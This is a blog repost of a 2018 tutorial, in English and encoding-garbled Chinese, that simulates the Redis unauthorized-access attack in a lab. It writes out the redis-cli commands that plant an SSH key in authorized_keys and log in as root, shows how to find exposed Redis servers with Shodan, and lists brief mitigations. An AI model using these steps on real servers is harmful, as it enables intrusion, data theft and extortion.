<p>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ã€å¹¿æ³›æµè¡Œçš„æ•°æ®ç»“æ„å·¥å…·ï¼Œå¯ä»¥ç”¨ä½œå†…å­˜ä¸­çš„åˆ†å¸ƒå¼æ•°æ®åº“ã€æ¶ˆæ¯ä»£ç†æˆ–ç¼“å­˜ã€‚å› ä¸ºå®ƒè¢«è®¾è®¡ä¸ºåœ¨å—ä¿¡ä»»çš„ç¯å¢ƒä¸­è®¿é—®ï¼Œæ‰€ä»¥ä¸åº”è¯¥åœ¨ Internet ä¸Šå…¬å¼€ã€‚ç„¶è€Œï¼Œä¸€äº› Redis ç»‘å®šåˆ°å…¬å…±æ¥å£ï¼Œç”šè‡³æ²¡æœ‰å¯†ç èº«ä»½éªŒè¯ä¿æŠ¤ã€‚</p>
<p>Under certain conditions, if Redis runs with the root account (or not even), attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges, delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.</p>
<p>åœ¨æŸäº›æ¡ä»¶ä¸‹ï¼Œå¦‚æœRedisä½¿ç”¨ root å¸æˆ·è¿è¡Œï¼ˆç”šè‡³ä¸ä½¿ç”¨ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥å‘æ ¹å¸æˆ·å†™å…¥ SSH å…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡ SSH ç™»å½•åˆ°å—å®³æœåŠ¡å™¨ã€‚è¿™å¯èƒ½ä½¿é»‘å®¢è·å¾—æœåŠ¡å™¨ç‰¹æƒï¼Œåˆ é™¤æˆ–çªƒå–æ•°æ®ï¼Œç”šè‡³å¯¼è‡´åŠ å¯†å‹’ç´¢ï¼Œä¸¥é‡å±å®³æ­£å¸¸çš„ä¸šåŠ¡æœåŠ¡ã€‚</p>
<p>The simplified flow of this exploit is:</p>
<ul>
<li>Login to a unprotected Redis</li>
<li>Change itâ€™s backup location to .ssh directoryâ€Šâ€”â€ŠWrite the SSH Keys to new backup location</li>
<li>Remote connect and login to the target server using SSH key</li>
</ul>
<p>We should already be familiar how automatic SSH login with private + public keys works.</p>
<p>ç®€åŒ–å®ç°æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>ç™»å½•åˆ°ä¸€ä¸ªæ— ä¿æŠ¤çš„ Redis</li>
<li>å°†å¤‡ä»½ä½ç½®æ›´æ”¹ä¸º .ssh ç›®å½• â€”â€” å°†SSHå¯†é’¥å†™å…¥æ–°çš„å¤‡ä»½ä½ç½®</li>
<li>ä½¿ç”¨ SSH å¯†é’¥è¿œç¨‹è¿æ¥å¹¶ç™»å½•åˆ°ç›®æ ‡æœåŠ¡å™¨</li>
</ul>
<p>æˆ‘ä»¬åº”è¯¥å·²ç»ç†Ÿæ‚‰äº†å¦‚ä½•ä½¿ç”¨ç§æœ‰+å…¬é’¥è‡ªåŠ¨ç™»å½• SSHã€‚</p>
<h2 id="Simulation"><a href="#Simulation" class="headerlink" title="Simulation"></a>Simulation</h2><h2 id="æ¨¡æ‹Ÿ"><a href="#æ¨¡æ‹Ÿ" class="headerlink" title="æ¨¡æ‹Ÿ"></a>æ¨¡æ‹Ÿ</h2><p>Now letâ€™s get our feet wet and set up a target machine. Weâ€™ll need two machines, they can be real machines, virtual machines, or remote machines (VPS). As long as the attack end is able to ping the target end, we are good.</p>
<p>ç°åœ¨è®©æˆ‘ä»¬å…ˆæŠŠåšå¥½æ¨¡æ‹Ÿå‰å‡†å¤‡ã€‚æˆ‘ä»¬éœ€è¦ä¸¤å°æœºå™¨ï¼Œå®ƒä»¬å¯ä»¥æ˜¯çœŸæ­£çš„æœºå™¨ã€è™šæ‹Ÿæœºæˆ–è¿œç¨‹æœºå™¨(VPS)ã€‚åªè¦æ”»å‡»ç«¯èƒ½å¤Ÿ ping ç›®æ ‡ç«¯å°±å¯ä»¥äº†ã€‚</p>
<p>Environment setup for this example:</p>
<ul>
<li>Target Machine: Redis-3.2.11 on Ubuntu</li>
<li>Attack Machine: Platform you like with Redis (I used Kali)</li>
</ul>
<p>ç¤ºä¾‹ä¸­çš„ç¯å¢ƒå¦‚ä¸‹ï¼š</p>
<ul>
<li>ç›®æ ‡æœºå™¨ï¼šubuntu ä¸‹æœ‰ Redis-3.2.11</li>
<li>æ”»å‡»æœºå™¨ï¼šä½ å–œæ¬¢çš„å¹³å°ä¸ Redis(æˆ‘ç”¨çš„æ˜¯ Kali)</li>
</ul>
<h3 id="Set-Up-Target-Machine"><a href="#Set-Up-Target-Machine" class="headerlink" title="Set Up Target Machine:"></a>Set Up Target Machine:</h3><h3 id="è®¾å®šç›®æ ‡æœºå™¨ï¼š"><a href="#è®¾å®šç›®æ ‡æœºå™¨ï¼š" class="headerlink" title="è®¾å®šç›®æ ‡æœºå™¨ï¼š"></a>è®¾å®šç›®æ ‡æœºå™¨ï¼š</h3><p>First, let us set up the target machine with Redis. Download source code by</p>
<p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬é…ç½®ç›®æ ‡æœºå™¨çš„ Reidsã€‚ä¸‹è½½æºä»£ç </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.11.tar.gz</span><br></pre></td></tr></table></figure>
<p>Extract and build</p>
<p>æå–å’Œæ„å»º</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar xzf redis-3.2.11.tar.gz cd redis-3.2.11</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>After make, we use our favorite editor to open <code>redis.conf</code> in <code>redis-3.2.11</code> folder. In order to be remotely accessed, we will need to comment out line <code>bind 127.0.0.1</code> and disable <code>protected-mode</code> as shown below.</p>
<p>ç¼–è¯‘åï¼Œæˆ‘ä»¬ä½¿ç”¨æˆ‘ä»¬æœ€å–œæ¬¢çš„ç¼–è¾‘å™¨æ‰“å¼€ <code>redis-3.2.11</code> æ–‡ä»¶å¤¹ çš„ <code>redis.conf</code>ã€‚ä¸ºäº†è¿œç¨‹è®¿é—®ï¼Œæˆ‘ä»¬éœ€è¦æ³¨é‡Šæ‰ <code>bind 127.0.0.1</code> è¡Œï¼Œå¹¶ç¦ç”¨ <code>protected-mode</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<p><img src="/img/review/0_UqCMKzd401p_9xgf.png" alt></p>
<p>Now fire up Redis with the configuration file we just edited. Note that <code>redis-server</code> is in <code>redis-3.2.11/src</code>.</p>
<p>ç°åœ¨ç”¨æˆ‘ä»¬åˆšåˆšç¼–è¾‘çš„é…ç½®æ–‡ä»¶å¯åŠ¨Redisã€‚æ³¨æ„ <code>redis-server</code> åœ¨ <code>redis-3.2.11/src</code> ä¸­ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/redis-server redis.conf</span><br></pre></td></tr></table></figure>
<p>So far, we have finished setting up the target server. Additionally, we should also check if we have <code>.ssh</code> folder. If not, we should create it for the attack later.</p>
<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»å®Œæˆäº†ç›®æ ‡æœåŠ¡å™¨çš„è®¾ç½®ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜åº”è¯¥æ£€æŸ¥æˆ‘ä»¬æ˜¯å¦æœ‰ <code>.ssh</code>çš„æ–‡ä»¶å¤¹ã€‚å¦‚æœæ²¡æœ‰ï¼Œæˆ‘ä»¬åº”è¯¥ä¸ºä»¥åçš„æ”»å‡»åˆ›å»ºå®ƒã€‚</p>
<h3 id="Attack-Machine"><a href="#Attack-Machine" class="headerlink" title="Attack Machine:"></a>Attack Machine:</h3><h3 id="æ”»å‡»æœºå™¨ï¼š"><a href="#æ”»å‡»æœºå™¨ï¼š" class="headerlink" title="æ”»å‡»æœºå™¨ï¼š"></a>æ”»å‡»æœºå™¨ï¼š</h3><p>First, make sure we can ping the target. Then, we will generate a private key and public key for SSHing into the target machine later. Run the following command to generate SSH keys and leave passphrase empty.</p>
<p>é¦–å…ˆï¼Œç¡®ä¿æˆ‘ä»¬èƒ½é”å®šç›®æ ‡ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ç”Ÿæˆç§é’¥å’Œå…¬é’¥ï¼Œä»¥ä¾¿ç¨åå°†å…¶æ’å…¥ç›®æ ‡æœºå™¨ã€‚è¿è¡Œä»¥ä¸‹å‘½ä»¤ç”ŸæˆSSHå¯†é’¥ï¼Œå¹¶ä¿ç•™å¯†ç ä¸ºç©ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
<p>Next, enter the <code>.ssh</code> folder. If you are root user, enter <code>/.ssh</code>, otherwise <code>~/.ssh</code>, then copy the private key in to <code>temp.txt</code>.</p>
<p>ä¸‹ä¸€æ­¥ï¼Œè¿›å…¥ <code>.ssh</code> ç›®å½•ã€‚å¦‚æœä½ æ˜¯ root ç”¨æˆ·ï¼Œè¿›å…¥ <code>/.ssh</code>ï¼Œå…¶ä»–çš„è¿›å…¥ <code>~/.ssh</code>ã€‚å¤åˆ¶ç§é’¥åˆ° <code>temp.txt</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; temp.txt</span><br></pre></td></tr></table></figure>
<p>Some may be wondering that why do we put two blank lines before and after the public key? We will leave that as a mystery for right now if you donâ€™t know :)</p>
<p>æœ‰äº›äººå¯èƒ½æƒ³çŸ¥é“ï¼Œä¸ºä»€ä¹ˆåœ¨å…¬é’¥ä¹‹å‰å’Œä¹‹åè¦æ”¾ä¸¤è¡Œç©ºç™½?å¦‚æœä½ ä¸çŸ¥é“ï¼Œæˆ‘ä»¬æš‚æ—¶æŠŠå®ƒä½œä¸ºä¸€ä¸ªè°œ :)</p>
<p><img src="/img/review/0_kj5v1UOnDs4_1B-4.png" alt></p>
<p>Good! So far we have generated a pair a keys, we will need to find a way to smuggle the public key to the Redis server (target machine.)</p>
<p>å¥½äº†ï¼åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»ç”Ÿæˆäº†ä¸€å¯¹å¯†é’¥ï¼Œæˆ‘ä»¬å°†éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•å°†å…¬é’¥å·è¿åˆ°RedisæœåŠ¡å™¨(ç›®æ ‡æœºå™¨)ã€‚</p>
<p>We are going to use <code>redis-cli</code>, the Redis command line interface, to send commands to Redis and read the replies sent by the server directly in the terminal.</p>
<p>æˆ‘ä»¬å°†ä½¿ç”¨ <code>redis-cli</code>ï¼Œå³ Redis å‘½ä»¤è¡Œæ¥å£ï¼Œå‘ Redis å‘é€å‘½ä»¤ï¼Œå¹¶ç›´æ¥è¯»å–ç»ˆç«¯æœåŠ¡å™¨å‘é€çš„å“åº”ã€‚</p>
<p>Run the following commands in <code>redis-3.2.11/src</code> folder. (Or depending where we are, we can always specify the path to the files we use)</p>
<p>åœ¨ <code>redis-3.2.11/src</code> æ–‡ä»¶å¤¹ä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚(æˆ–è€…æ ¹æ®æˆ‘ä»¬çš„ä½ç½®ï¼Œæˆ‘ä»¬æ€»æ˜¯å¯ä»¥æŒ‡å®šæˆ‘ä»¬ä½¿ç”¨çš„æ–‡ä»¶çš„è·¯å¾„)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /.ssh/temp.txt | redis-cli -h 203.137.255.255 -x set s-key</span><br></pre></td></tr></table></figure>
<p>Here, letâ€™s take a look at the command. We use <code>-h</code> flag to specify the remote Redis server IP so that <code>redis-cli</code> knows where to connect and send commands. The part after <code>-x</code> is saying that we are setting the key in redis named <code>s-key</code> with the value in <code>temp.txt</code>.</p>
<p>åœ¨è¿™é‡Œï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å‘½ä»¤ã€‚æˆ‘ä»¬ä½¿ç”¨ <code>-h</code> æ ‡å¿—æ¥æŒ‡å®šè¿œç¨‹ Redis æœåŠ¡å™¨ IPï¼Œä»¥ä¾¿ <code>redis-cli</code> çŸ¥é“åœ¨ä½•å¤„è¿æ¥å’Œå‘é€å‘½ä»¤ã€‚<code>-x</code> åé¢çš„éƒ¨åˆ†è¡¨ç¤ºï¼Œæˆ‘ä»¬æ­£åœ¨è®¾ç½® redis ä¸­çš„é”®åä¸º <code>s-key</code>ï¼Œå…¶å€¼ä½äº <code>temp.txt</code> ä¸­ã€‚</p>
<p><img src="/img/review/0_RXLExaGb28VkI0xO.png" alt></p>
<p>Yea, we have a key with our SSH key sneaked in! Letâ€™s connect to the Redis and play around its configuration. Use <code>redis-cli</code> to connect to the Redis server again.</p>
<p>æ˜¯çš„ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªå¯†é’¥ï¼ŒSSH å¯†é’¥å·å·æºœè¿›æ¥äº†!è®©æˆ‘ä»¬è¿æ¥åˆ°Rediså¹¶ç ”ç©¶å®ƒçš„é…ç½®ã€‚å†æ¬¡ä½¿ç”¨ <code>redis-cli</code> è¿æ¥åˆ° Redis æœåŠ¡å™¨ã€‚</p>
<p><img src="/img/review/0_ly-kkskrTIJ72LFM.png" alt></p>
<p>Looking at the above screenshot, we first verify the value of the key <code>s-key</code> by using the command <code>GET s-key</code>, which is what we want â€“ the public key with two blank lines before and after. Then I tried the command â€œdirâ€ just to see what it says (kidding). What we actually want to do here is to get the value of â€œs-keyâ€ (SSH public key) stored in the <code>.ssh</code> folder so that we can remote SSH login to the target machine whithout having to type the password.</p>
<p>æŸ¥çœ‹ä¸Šé¢çš„å±å¹•æˆªå›¾ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨å‘½ä»¤ <code>GET s-key</code> æ¥éªŒè¯é”® <code>s-key</code> çš„å€¼ï¼Œè¿™æ­£æ˜¯æˆ‘ä»¬æƒ³è¦çš„â€”â€”å‰åå„æœ‰ä¸¤è¡Œç©ºç™½çš„å…¬é’¥ã€‚ç„¶åï¼Œæˆ‘å°è¯•å‘½ä»¤ â€œdirâ€ï¼Œåªæ˜¯ä¸ºäº†çœ‹çœ‹å®ƒè¯´äº†ä»€ä¹ˆ(å¼€ç©ç¬‘)ã€‚è¿™é‡Œæˆ‘ä»¬çœŸæ­£æƒ³åšçš„æ˜¯è·å–å­˜å‚¨åœ¨ <code>.ssh</code> æ–‡ä»¶å¤¹ä¸­çš„â€œs-keyâ€(SSHå…¬é’¥)çš„å€¼ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥è¿œç¨‹sshç™»å½•åˆ°ç›®æ ‡æœºå™¨ï¼Œè€Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚</p>
<p>Thus, we will do this:</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å°†è¿™æ ·åš:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG GET dir # get your redis directory</span><br><span class="line"># In the output of above command &quot;/home/xxxx/redis-3.2.11/src&quot; is the directory where redis server is installed. CONFIG SET dir</span><br><span class="line">/home/xxxx/.ssh # set the backup location to the .ssh folder</span><br><span class="line">(or) CONFIG SET dir /root/.ssh CONFIG SET dbfilename authorized_keys</span><br><span class="line"># lastly we back our data containing our &quot;s-key&quot; key-value pair up in the .ssh folder</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The authorized_keys file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured Source: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>The screenshot shown above already demonstrates the steps mentioned here.</p>
</blockquote>
<blockquote>
<p>SSHä¸­çš„ authorized_keys æ–‡ä»¶æŒ‡å®šäº† SSH å¯†é’¥ï¼Œå¯ç”¨äºç™»å½•åˆ°æ–‡ä»¶é…ç½®æºçš„ç”¨æˆ·å¸æˆ·: <a href="https://www.ssh.com/ssh/authorized_keys/" target="_blank" rel="noopener">ssh.com</a><br>ä¸Šé¢çš„æˆªå›¾å·²ç»æ¼”ç¤ºäº†è¿™é‡Œæåˆ°çš„æ­¥éª¤ã€‚</p>
</blockquote>
<h3 id="Harvest-Time"><a href="#Harvest-Time" class="headerlink" title="Harvest Time"></a>Harvest Time</h3><h3 id="ç»“æœæ—¶é—´"><a href="#ç»“æœæ—¶é—´" class="headerlink" title="ç»“æœæ—¶é—´"></a>ç»“æœæ—¶é—´</h3><p>On Attack Machine, try to SSH in the Target Machine using the following command.</p>
<p>åœ¨æ”»å‡»æœºå™¨ä¸Šï¼Œå°è¯•ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤åœ¨ç›®æ ‡æœºå™¨ä¸ŠSSHã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># command: private key username@server IP</span><br><span class="line">ssh -i id_rsa username@203.137.255.255</span><br></pre></td></tr></table></figure>
<p><img src="/img/review/0_xTWYFYecso8XJKdI.png" alt></p>
<p>YAS! As we can see, we have a successful auto-login with SSH keys! Voila, we have now completed the attack simulation. ğŸ˜ƒ</p>
<p>å¥½ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸåœ°ä½¿ç”¨ SSH å¯†é’¥è‡ªåŠ¨ç™»å½•!ç§ï¼Œæˆ‘ä»¬ç°åœ¨å·²ç»å®Œæˆäº†æ”»å‡»æ¨¡æ‹Ÿã€‚ğŸ˜ƒ</p>
<p>(Smiley face actually means that Iâ€™m finally almost done writing this up ğŸ˜‚)</p>
<p>(ç¬‘è„¸å®é™…ä¸Šæ„å‘³ç€æˆ‘å·®ä¸å¤šå†™å®Œäº†ğŸ˜‚)</p>
<p>At the end of this section, I would like to show what is Redisâ€™s backup file look like.</p>
<p>åœ¨æœ¬èŠ‚çš„æœ€åï¼Œæˆ‘æƒ³å±•ç¤ºä¸€ä¸‹ä»€ä¹ˆæ˜¯ Redis çš„å¤‡ä»½æ–‡ä»¶ã€‚</p>
<p><img src="/img/review/0_wjEeD2SSdTnymBVT.png" alt></p>
<p>Notice the unreadable characters? Add â€œ\n\nâ€ before and after the key content was just to be safe and separate it from other â€œstuffâ€ so that it can be parsed correctly. ğŸ‘Œ</p>
<p>æ³¨æ„åˆ°è¿™äº›ä¸å¯è¯»çš„å­—ç¬¦äº†å—?åœ¨å…³é”®å†…å®¹ä¹‹å‰å’Œä¹‹åæ·»åŠ â€œ\n\nâ€åªæ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå¹¶å°†å…¶ä¸å…¶ä»–â€œå†…å®¹â€åˆ†å¼€ï¼Œä»¥ä¾¿æ­£ç¡®è§£æã€‚</p>
<h2 id="Use-Search-Engine-to-find-Vulnerable-Redis-Servers"><a href="#Use-Search-Engine-to-find-Vulnerable-Redis-Servers" class="headerlink" title="Use Search Engine to find Vulnerable Redis Servers"></a>Use Search Engine to find Vulnerable Redis Servers</h2><h2 id="ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨"><a href="#ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨" class="headerlink" title="ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨"></a>ä½¿ç”¨æœç´¢å¼•æ“æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„RedisæœåŠ¡å™¨</h2><p>Alrighty, as I mentioned, we are going to use <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> to search servers that has Redis footprint (characteristics).</p>
<p>å¥½çš„ï¼Œæ­£å¦‚æˆ‘æåˆ°çš„ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a> æ¥æœç´¢å…·æœ‰ Redis footprint(ç‰¹å¾)çš„æœåŠ¡å™¨ã€‚</p>
<p>Let us do a simple search by Redisâ€™ default port.</p>
<p>è®©æˆ‘ä»¬åšä¸€ä¸ªç®€å•çš„æœç´¢ï¼Œé€šè¿‡Redisçš„é»˜è®¤ç«¯å£ã€‚</p>
<p><img src="/img/review/0_ueth-xQWtxJobzwL.png" alt></p>
<p>Looks like we have 75,665 search results. Aaaaaand guess what! Right down there (not shown but we can see it if we scroll down) there are TONS of host that has NO password protection!!</p>
<p>çœ‹èµ·æ¥æˆ‘ä»¬æœ‰ 75,665 ä¸ªæœç´¢ç»“æœã€‚çŒœçŒœçœ‹!å°±åœ¨é‚£é‡Œ(æ²¡æœ‰æ˜¾ç¤ºï¼Œä½†æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬å‘ä¸‹æ»šåŠ¨)æœ‰äº›ä¸»æœºæ²¡æœ‰å¯†ç ä¿æŠ¤!!</p>
<p>This vulnerability was found years ago and still countless of machines are opening up themselves in such an easy way for attackers to have fun in there serverâ€¦</p>
<p>è¿™ä¸ªæ¼æ´æ˜¯å‡ å¹´å‰å‘ç°çš„ï¼Œä»ç„¶æœ‰æ— æ•°çš„æœºå™¨ä»¥è¿™ç§ç®€å•çš„æ–¹å¼æ‰“å¼€è‡ªå·±ï¼Œè®©æ”»å‡»è€…åœ¨é‚£é‡Œçš„æœåŠ¡å™¨ä¸­å¾—åˆ°ä¹è¶£â€¦</p>
<p>According to Shodan, there are around <strong>56,000 unprotected</strong> Redis instances in 2015.</p>
<p>æ ¹æ® Shodan çš„æ•°æ®ï¼Œ2015 å¹´å¤§çº¦æœ‰ 5,6000 ä¸ªä¸å—ä¿æŠ¤çš„Rediså®ä¾‹ã€‚</p>
<p><img src="/img/review/0_C2n27eAOGFkK79IU.png" alt></p>
<p>According to ZoomEye, the distribution of the instances is.</p>
<p>æ ¹æ® ZoomEyeï¼Œå®ä¾‹çš„åˆ†å¸ƒæ˜¯ã€‚</p>
<p><img src="img/0_m19lcFYeFOhB_Nui.png" alt></p>
<p>According to ZoomEye, the top ranking countries of these instances are: China, USA, Germanyâ€¦</p>
<p>ZoomEyeè¡¨ç¤ºï¼Œè¿™äº›ä¾‹å­ä¸­æ’åæœ€é«˜çš„å›½å®¶æ˜¯:ä¸­å›½ã€ç¾å›½ã€å¾·å›½â€¦â€¦</p>
<p><img src="img/0_hxf9oaOFJVDohZMC.png" alt></p>
<p>Okay, back to the business. So how do we verify if a server is protected using python? It turns out to be fairly simple.</p>
<p>å¥½äº†ï¼Œå›åˆ°æ­£é¢˜ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•éªŒè¯æ˜¯å¦ä½¿ç”¨ python ä¿æŠ¤æœåŠ¡å™¨å‘¢ï¼Ÿç»“æœç›¸å½“ç®€å•ã€‚</p>
<ol>
<li>Use socket to connect to the target IP</li>
<li>Perform a GET request</li>
<li><p>If the server is unprotected, you GET request will succeed; otherwise it will fail</p>
</li>
<li><p>ä½¿ç”¨å¥—æ¥å­—è¿æ¥åˆ°ç›®æ ‡IP</p>
</li>
<li>æ‰§è¡ŒGETè¯·æ±‚</li>
<li>å¦‚æœæœåŠ¡å™¨ä¸å—ä¿æŠ¤ï¼Œæ‚¨çš„GETè¯·æ±‚å°†æˆåŠŸ;å¦åˆ™å°±ä¼šå¤±è´¥</li>
</ol>
<p><img src="img/0_C4_dcCGWAPWxFbaU.png" alt></p>
<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><h2 id="å‡è½»"><a href="#å‡è½»" class="headerlink" title="å‡è½»"></a>å‡è½»</h2><ul>
<li>Donâ€™t bind to 0.0.0.0</li>
<li>If you have to, change the default port (6379)</li>
<li><p>Set a password (for everything)</p>
</li>
<li><p>ä¸è¦ç»‘å®š 0.0.0.0</p>
</li>
<li>å¦‚æœæœ‰å¿…è¦çš„è¯ï¼Œä¿®æ”¹é»˜è®¤ç«¯å£ (6379)</li>
<li>ä¸ºæ‰€æœ‰çš„ Reids è®¾ç½®å¯†ç </li>
</ul>
<p>Sep 11, 2018 ï¼ˆ2018-09-11ï¼‰</p>
<p>author: Victor Zhu</p>
<p>link: <a href="https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419" target="_blank" rel="noopener">https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/img/12641322.jpg" alt="jani">
            
              <p class="site-author-name" itemprop="name">jani</p>
              <p class="site-description motion-element" itemprop="description">ä¸€èµ·å­¦ä¹ ï¼Œä¸€èµ·è¿›æ­¥</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/test-lin" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:liberty_linlin@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">jani</span>

  
  <a href="http://www.miitbeian.gov.cn/">ç²¤ICPå¤‡17086938å·-1</a>
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
